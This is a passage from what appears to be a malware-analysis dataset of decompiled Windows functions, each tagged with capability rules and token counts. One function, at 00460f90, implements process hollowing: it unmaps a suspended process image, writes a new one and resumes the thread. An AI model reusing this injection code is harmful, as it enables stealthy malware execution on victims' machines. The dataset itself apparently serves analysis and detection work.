0x4601d8;\n        uStack124 = 0x45ff55;\n        iVar1 = sub.kernel32.dll_GetPrivateProfileIntA();\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            var_10h = 0x45ff6a;\n            fcn.0040546c();\n            var_10h = 0x45ff77;\n            fcn.00403ea8();\n            var_10h = 0x45ff85;\n            fcn.004056d0();\n            if (iVar1 < 10) {\n                var_10h = 0x45ffac;\n                fcn.00405784();\n            }\n            else {\n                var_10h = 0x45ff9a;\n                fcn.00405784();\n            }\n            var_10h = 0x45ffb4;\n            puVar2 = fcn.004058fc();\n            var_14h = 0x400;\n            hKey = &fcn.0045fe2c::var_125h;\n            nDefault = 0x46020c;\n            var_20h = 0x460210;\n            puStack40 = 0x45ffd5;\n            var_10h = puVar2;\n            puVar3 = fcn.004058fc();\n            puStack44 = 0x45ffdd;\n            puStack40 = puVar3;\n            sub.kernel32.dll_GetPrivateProfileStringA();\n            uStack48 = 0x400;\n            puStack52 = &fcn.0045fe2c::lpReturnedString;\n            uStack56 = 0x46020c;\n            uStack60 = 0x460218;\n            puStack68 = 0x45fffa;\n            puStack64 = puVar3;\n            puStack44 = puVar2;\n            sub.kernel32.dll_GetPrivateProfileStringA();\n            uStack72 = 0x400;\n            puStack76 = &fcn.0045fe2c::var_32fh;\n            uStack80 = 0x46020c;\n            puStack84 = 0x46022c;\n            uStack92 = 0x460017;\n            puStack88 = puVar3;\n            puStack68 = puVar2;\n            sub.kernel32.dll_GetPrivateProfileStringA();\n            uStack92 = 0x460029;\n            fcn.00405654();\n            uStack92 = 0x460037;\n            var_14h = fcn.00403eb4();\n            if (var_14h == 0) {\n                uStack92 = 0x460097;\n                fcn.00405664();\n                uStack92 = 0x4600a8;\n                fcn.0045fb80();\n                uStack92 = 0x4600bd;\n                fcn.00405784();\n            }\n            else if (var_14h == 1) {\n                uStack92 = 0x460074;\n                fcn.004056dc();\n                uStack92 = 0x460087;\n                fcn.00405784();\n            }\n            else if (var_14h == 2) {\n                uStack92 = 0x46005c;\n                fcn.004056dc();\n            }\n            uStack92 = 0x4600cc;\n            fcn.00405738();\n            uStack92 = 0x4600d7;\n            fcn.0045fbf8();\n            uStack92 = 0x4600e5;\n            fcn.00405738();\n        }\n    }\n    *in_FS_OFFSET = puStack88;\n    uStack80 = 0x460133;\n    puStack84 = 0x46010e;\n    fcn.00405490();\n    puStack84 = 0x46011e;\n    fcn.00405490();\n    puStack84 = 0x46012b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1933
    },
    "0046069c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046069c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    bool bVar6;\n    uchar uVar7;\n    int32_t in_stack_fffffe0c;\n    int32_t iStack396;\n    uint uStack392;\n    uchar *puStack388;\n    uint var_170h;\n    uint var_16ch;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    uint var_54h;\n    uint lpBuffer;\n    int32_t var_2ch;\n    uint lDistanceToMove;\n    int32_t lpNumberOfBytesRead;\n    int32_t var_ch;\n    uchar var_5h;\n    uint32_t nNumberOfBytesToRead;\n    \n    puStack388 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack392 = 0x4609fc;\n    iStack396 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack396;\n    iVar4 = 0;\n    fcn.00403aac();\n    fcn.0040546c();\n    fcn.0040546c();\n    iVar1 = sub.kernel32.dll_CreateFileA_1();\n    if (iVar1 != -1) {\n        sub.kernel32.dll_ReadFile_1(iVar1, &lpBuffer, 0x2c, &lpNumberOfBytesRead, 0);\n        if (lpNumberOfBytesRead == 0x2c) {\n            fcn.004056dc();\n            iVar2 = fcn.00405a48();\n            if ((iVar2 != 0) && (var_2ch == 0x700)) {\n                sub.kernel32.dll_SetFilePointer_1(iVar1, lDistanceToMove, 0, 0);\n                sub.kernel32.dll_ReadFile_1(iVar1, &var_5ch, 0x20, &lpNumberOfBytesRead, 0);\n                if ((lpNumberOfBytesRead == 0x20) && (var_5ch == 0x43decade)) {\n                    sub.kernel32.dll_SetFilePointer_1(iVar1, var_54h, 0, 0);\n                    do {\n                        sub.kernel32.dll_ReadFile_1(iVar1, &var_6ch, 0x10, &lpNumberOfBytesRead, 0);\n                        if ((lpNumberOfBytesRead == 0x10) && (var_6ch == 0x53decade)) {\n                            uVar5 = 0;\n                            do {\n                                nNumberOfBytesToRead = 0;\n                                fcn.00403aac();\n                                sub.kernel32.dll_ReadFile_1(iVar1, &nNumberOfBytesToRead, 1, &lpNumberOfBytesRead, 0);\n                                sub.kernel32.dll_ReadFile_1();\n                                uVar5 = uVar5 + 2 + nNumberOfBytesToRead;\n                                fcn.004056dc();\n                                if (var_ch != 0) {\n                                    sub.kernel32.dll_ReadFile_1();\n                                    var_5h = nNumberOfBytesToRead;\n                                    uVar3 = nNumberOfBytesToRead & 0xff;\n                                    bVar6 = uVar3 == 4;\n                                    if (uVar3 < 5) {\n                                        if (bVar6) {\n                                            fcn.00405894();\n                                            if (bVar6) {\n                                                fcn.00403aac();\n                                                sub.kernel32.dll_ReadFile_1();\n                                                fcn.004056dc();\n                                                iVar4 = -1;\n                                            }\n                                            else {\n                                                sub.kernel32.dll_SetFilePointer_1();\n                                            }\n                                            uVar5 = uVar5 + 4;\n                                        }\n                                        else if (uVar3 == 1) {\n                                            sub.kernel32.dll_SetFilePointer_1();\n                                            uVar5 = uVar5 + 1;\n                                        }\n                                        else {\n                                            if (uVar3 != 2) goto code_r0x004609ae;\n                                            sub.kernel32.dll_SetFilePointer_1();\n                                            uVar5 = uVar5 + 2;\n                                        }\n                                    }\n                                    else if (uVar3 == 0xfe) {\n                                        sub.kernel32.dll_ReadFile_1\n                                                  (iVar1, &nNumberOfBytesToRead, 4, &lpNumberOfBytesRead, 0);\n                                        sub.kernel32.dll_SetFilePointer_1();\n                                        uVar5 = uVar5 + 4 + nNumberOfBytesToRead;\n                                    }\n                                    else if (uVar3 == 0xff) {\n                                        uVar7 = 1;\n                                        nNumberOfBytesToRead = 0;\n                                        sub.kernel32.dll_ReadFile_1\n                                                  (iVar1, &nNumberOfBytesToRead, 2, &lpNumberOfBytesRead, 0);\n                                        fcn.00405894();\n                                        if (((uVar7) && (nNumberOfBytesToRead < 0x11)) && (iVar4 != 0)) {\n                                            fcn.00403aac();\n                                            sub.kernel32.dll_ReadFile_1();\n                                            fcn.004056dc();\n                                            iVar4 = 0;\n                                        }\n                                        else {\n                                            sub.kernel32.dll_SetFilePointer_1();\n                                        }\n                                        uVar5 = uVar5 + 2 + nNumberOfBytesToRead;\n                                    }\n                                    else {\ncode_r0x004609ae:\n                                        if (var_68h != 0) break;\n                                    }\n                                }\n                            } while (uVar5 < var_60h);\n                        }\n                        sub.kernel32.dll_SetFilePointer_1();\n                    } while (var_68h != 0);\n                }\n            }\n        }\n        sub.kernel32.dll_CloseHandle_1();\n        in_stack_fffffe0c = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_fffffe0c;\n    fcn.0040546c(0x460a03);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1318
    },
    "00460ce8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00460ce8(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar auStack12 [8];\n    \n    puStack16 = auStack12;\n    uStack20 = 1;\n    uStack24 = 0;\n    uStack28 = 0x460d5c;\n    sub.advapi32.dll_RegOpenKeyExA_1();\n    uStack28 = 0x104;\n    fcn.0040555c();\n    uVar2 = 0x80000002;\n    iVar1 = sub.advapi32.dll_RegQueryValueExA_1(0x80000002, 0x460d70, 0, 0, *0x4984fc, &uStack28);\n    if (iVar1 == 0) {\n        fcn.00460a48();\n    }\n    sub.advapi32.dll_RegCloseKey_1(uVar2);\n    return;\n}\n",
        "token_count": 230
    },
    "00460e18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460e18(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    if (*(arg_ch + 0xa4) != 0) {\n        for (var_ch = *(arg_ch + 0xa0) + arg_8h; *var_ch != 0; var_ch = var_ch[1] + var_ch) {\n            iVar1 = *var_ch;\n            piVar4 = var_ch + 2;\n            iVar2 = fcn.00403450();\n            do {\n                if (*piVar4 >> 0xc == 3) {\n                    piVar3 = iVar1 + arg_8h + (*piVar4 & 0xfff);\n                    *piVar3 = *piVar3 + arg_10h;\n                }\n                piVar4 = piVar4 + 2;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "00460f5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00460f5c(void)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0xd0, 0x1000, 4);\n    *in_EAX = uVar1;\n    uVar1 = *in_EAX;\n    if (*in_EAX != 0) {\n        for (; (uVar1 & 3) != 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00460f90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00460f90(int16_t *param_1, uchar *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    uchar *in_stack_ffffff60;\n    int32_t iStack144;\n    uint *puStack140;\n    uchar *puStack136;\n    uint *var_74h;\n    uchar *puStack116;\n    int32_t iStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint *puStack100;\n    uchar *hProcess;\n    int32_t hThread;\n    uint lpNumberOfBytesWritten;\n    int32_t lpBaseAddress;\n    int32_t lpBuffer;\n    uchar *lpAddress;\n    uint *lpContext;\n    int32_t var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    puStack136 = 0x460fa9;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack136 = 0x460fb1;\n    fcn.004058ec();\n    puStack140 = 0x4611f8;\n    iStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    puStack136 = &stack0xfffffffc;\n    if (var_8h != NULL) {\n        in_stack_ffffff60 = var_8h;\n        puStack136 = &stack0xfffffffc;\n        fcn.00405800(var_8h, 0x461220, var_4h, 0x461214);\n    }\n    var_ch = 0;\n    if ((*param_1 == 0x5a4d) && (arg_ch = param_1 + *(param_1 + 0x1e),  *arg_ch == 0x4550)) {\n        fcn.00403aac();\n        fcn.00403aac();\n        var_74h = 0x44;\n        puVar3 = &fcn.00460f90::var_74h;\n        uVar1 = fcn.004058fc(0, 0, 0, 4, 0, 0, puVar3, &fcn.00460f90::hProcess);\n        uVar1 = fcn.004058fc(uVar1);\n        iVar2 = sub.kernel32.dll_CreateProcessA(uVar1);\n        if (iVar2 != 0) {\n            lpContext = fcn.00460f5c();\n            if (lpContext != NULL) {\n                *lpContext = 0x10007;\n                iVar2 = sub.kernel32.dll_GetThreadContext(hThread, lpContext);\n                if (iVar2 != 0) {\n                    sub.kernel32.dll_ReadProcessMemory\n                              (hProcess, lpContext[0x29] + 8, &fcn.00460f90::lpBuffer, 4, \n                               &fcn.00460f90::lpNumberOfBytesWritten);\n                    if (arg_ch[0xd] == lpBuffer) {\n                        iVar2 = sub.ntdll_NtUnmapViewOfSection(hProcess, arg_ch[0xd]);\n                        if (iVar2 == 0) {\n                            lpBaseAddress =\n                                 sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                        }\n                        else {\n                            lpBaseAddress = sub.kernel32.dll_VirtualAllocEx(hProcess, 0, arg_ch[0x14], 0x3000, 0x40);\n                        }\n                    }\n                    else {\n                        lpBaseAddress =\n                             sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                    }\n                    if (lpBaseAddress != 0) {\n                        uStack108 = fcn.00460ed0();\n                        if (arg_ch[0xd] != lpBaseAddress) {\n                            fcn.00460e18(uStack108, arg_ch, lpBaseAddress - arg_ch[0xd]);\n                            arg_ch[0xd] = lpBaseAddress;\n                            fcn.0040858c();\n                        }\n                        puStack100 = &fcn.00460f90::lpNumberOfBytesWritten;\n                        iStack104 = arg_ch[0x14];\n                        iStack112 = lpBaseAddress;\n                        puStack116 = hProcess;\n                        var_74h = 0x461171;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        var_74h = &fcn.00460f90::lpNumberOfBytesWritten;\n                        puStack136 = hProcess;\n                        puStack140 = 0x461191;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        lpContext[0x2c] = arg_ch[10] + lpBaseAddress;\n                        puStack140 = lpContext;\n                        iStack144 = hThread;\n                        sub.kernel32.dll_SetThreadContext();\n                        sub.kernel32.dll_ResumeThread(hThread);\n                        var_ch = hThread;\n                    }\n                }\n                sub.kernel32.dll_VirtualFree_1(lpAddress, 0, 0x8000);\n                in_stack_ffffff60 = lpAddress;\n            }\n            if (var_ch == 0) {\n                sub.kernel32.dll_TerminateProcess(puVar3, 0);\n                in_stack_ffffff60 = hProcess;\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405490(0x4611ff);\n    return;\n}\n",
        "token_count": 1238
    },
    "00461224": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00461224(void)\n\n{\n    if (*0x498500 == 0) {\n        *0x498500 = sub.kernel32.dll_GetModuleHandleA_2(0x461380);\n        if (*0x498500 != 0) {\n            *0x498504 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461390);\n            *0x498508 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x4613ac);\n            *0x49850c = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x4613bc);\n            *0x498510 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x4613cc);\n            *0x498514 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x4613d8);\n            *0x498518 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x4613e4);\n            *0x49851c = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461400);\n            *0x498520 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461410);\n            *0x498524 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461420);\n            *0x498528 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461430);\n            *0x49852c = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461440);\n            *0x498530 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461450);\n            *0x498534 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461460);\n            *0x498538 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461470);\n            *0x49853c = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461480);\n            *0x498540 = sub.kernel32.dll_GetProcAddress_1(*0x498500, 0x461490);\n        }\n    }\n    if ((*0x498500 != 0) && (*0x498504 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 540
    },
    "00461848": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00461848(char *arg_8h)\n\n{\n    uint uVar1;\n    uint var_54h;\n    uint var_44h;\n    uint var_18h;\n    uint var_14h;\n    \n    uVar1 = (**(arg_8h + 0x10))(0x1f0fff, 0, *(arg_8h + 0x3c));\n    uVar1 = (**(arg_8h + 0xc))(uVar1, 0xffffffff);\n    *(arg_8h + 0x2c) = uVar1;\n    if ((*(arg_8h + 0x2c) == 0) && (*arg_8h == '\\x01')) {\n        uVar1 = (**(arg_8h + 0x18))(*(arg_8h + 0x38), 0x40000000, 2, 0, 1, 0x80, 0);\n        *(arg_8h + 0x30) = uVar1;\n        (**(arg_8h + 0x1c))(uVar1, *(arg_8h + 0x34), *(arg_8h + 0x24), arg_8h + 0x28, 0);\n        (**(arg_8h + 0x20))(*(arg_8h + 0x30));\n        (**(arg_8h + 8))(&var_44h, 0x44);\n        (**(arg_8h + 8))(&var_54h, 0x10);\n        var_44h = 0x44;\n        var_18h = 1;\n        var_14h._0_2_ = 5;\n        (**(arg_8h + 4))(0, *(arg_8h + 0x38), 0, 0, 0, 0, 0, 0, &var_44h, &var_54h);\n        (**(arg_8h + 0x20))(var_54h);\n        (**(arg_8h + 0x14))(0);\n    }\n    else if (*arg_8h == '\\0') {\n        (**(arg_8h + 0x14))(0);\n    }\n    return;\n}\n",
        "token_count": 522
    },
    "00462310": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462310(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x462324;\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n    }\n    puStack40 = 0x462333;\n    var_4h = in_ECX;\n    fcn.0040716c();\n    uStack44 = 0x46238e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = 0;\n    if (arg_8h == 0) {\n        puStack40 = &stack0xfffffffc;\n        uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromStream(var_4h, &fcn.00462310::var_8h);\n        *(in_EAX + 8) = uVar1;\n    }\n    else {\n        puStack40 = &stack0xfffffffc;\n        uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromStreamICM(var_4h, &fcn.00462310::var_8h);\n        *(in_EAX + 8) = uVar1;\n    }\n    fcn.00462300();\n    *in_FS_OFFSET = var_4h;\n    uStack48 = 0x462395;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 393
    },
    "004624fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004624fc(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x46258d;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x498584 = *0x498584 + 1;\n    if (*0x498584 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4918c4 != 0) {\n            fcn.00404640();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x4918c8 != 0) {\n            fcn.00404640();\n        }\n        if (*0x4918cc != 0) {\n            fcn.00404640();\n        }\n        if (*0x4918d0 != 0) {\n            fcn.00404640();\n        }\n        if (*0x4918d4 != 0) {\n            fcn.00404640();\n        }\n        uStack20 = *0x498580;\n        sub.gdiplus.dll_GdiplusShutdown();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 309
    },
    "00462598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004625e4)\n// WARNING: Removing unreachable block (ram,0x004625f2)\n// WARNING: Removing unreachable block (ram,0x0046260a)\n// WARNING: Removing unreachable block (ram,0x00462626)\n// WARNING: Removing unreachable block (ram,0x0046263c)\n// WARNING: Removing unreachable block (ram,0x00462640)\n\nvoid fcn.00462598(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x4625b4;\n    fcn.004058ec();\n    uStack48 = 0x462668;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00462240();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x46266f;\n    uStack48 = 0x46265f;\n    fcn.0040546c();\n    uStack48 = 0x462667;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 312
    },
    "00462c94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00462c94(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    if (*(in_EAX + 0xc) == '\\0') {\n        uStack16 = *(in_EAX + 0x3e);\n        uStack20 = *(*(in_EAX + 0x11) * 4 + 0x491938);\n        uStack24 = *(*(in_EAX + 0xf) * 4 + 0x4918d8);\n        sub.wsock32.dll_socket();\n        iVar1 = (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = iVar1;\n        *(in_EAX + 0xc) = iVar1 != -1;\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x31) == '\\x01') {\n                uStack24 = 1;\n                sub.wsock32.dll_ioctlsocket(in_EAX[0x10], 0x8004667e, &uStack24);\n                (**(*in_EAX + 0x38))();\n            }\n            in_EAX[0xd] = 0;\n            in_EAX[0xe] = 0;\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "00462d18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00462d18(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(in_EAX + 0xc) != '\\0') {\n        sub.wsock32.dll_closesocket(in_EAX[0x10]);\n        (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = -1;\n        *(in_EAX + 0xc) = 0;\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00463308": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00463308(void)\n\n{\n    if (*0x49871c == 0) {\n        *0x49871c = sub.kernel32.dll_LoadLibraryA(0x4634d4);\n        if (*0x49871c < 0x20) {\n            *0x49871c = 0;\n            return 0;\n        }\n        *0x498720 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4634e0);\n        *0x498724 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4634f0);\n        *0x498728 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463504);\n        *0x49872c = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463518);\n        *0x498730 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463504);\n        *0x498734 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463518);\n        *0x498738 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463530);\n        *0x49873c = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463544);\n        *0x498740 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x46355c);\n        *0x498744 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463574);\n        *0x498748 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463584);\n        *0x49874c = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463594);\n        *0x498750 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4635b0);\n        *0x498754 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4635c4);\n        *0x498758 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4635e0);\n        *0x49875c = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4635b0);\n        *0x498760 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4635c4);\n        *0x498764 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4635e0);\n        *0x498768 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x4635fc);\n        *0x49876c = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463610);\n        *0x498770 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x46362c);\n        *0x498774 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x463648);\n        *0x498778 = sub.kernel32.dll_GetProcAddress_1(*0x49871c, 0x46365c);\n    }\n    return 1;\n}\n",
        "token_count": 757
    },
    "0046387c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
